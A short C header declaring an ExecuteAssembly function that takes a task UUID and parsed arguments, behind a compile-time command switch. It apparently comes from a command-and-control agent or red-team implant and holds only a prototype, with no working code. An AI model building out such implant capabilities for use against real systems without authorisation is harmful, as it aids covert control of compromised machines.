#pragma once
#ifndef EXECUTE_ASSEMBLY_H
#define EXECUTE_ASSEMBLY_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY

VOID ExecuteAssembly(_In_ PCHAR taskUuid, _In_ PPARSER arguments);

#endif //INCLUDE_CMD_EXECUTE_ASSEMBLY

#endif  //EXECUTE_ASSEMBLY_H